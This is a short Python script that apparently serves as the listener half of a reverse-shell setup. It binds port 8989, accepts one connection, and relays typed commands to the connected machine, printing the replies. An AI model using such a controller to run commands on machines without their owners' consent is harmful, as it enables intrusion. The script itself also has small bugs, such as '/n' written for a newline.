import socket;
import sys;


# create a socket
def create_socket():
    try:
        global host
        global port 
        global s  
        host = ''
        port = 8989
        s = socket.socket()  
    except socket.error as msg:
        print('Socket creation error : '+str(msg))


#Binding the socket and listing  to connections
def bind_socket():
    try:
        print('Binding the port : ' +str(port))
        s.bind((host,port))
        s.listen(255)

    except socket.error as msg:
        print('Socket Binding error : ' + str(msg)+'/n'+'Retrying...')
        bind_socket()

#Establish a connection with a client (socket must be listing)

def socket_accept():
    conn, address = s.accept()
    print('Connection Established : IP=' +address[0]+ ' PORT='+str(address[1]))
    send_commands(conn)
    conn.close()

#send commands to clients:
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end="")
        

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()

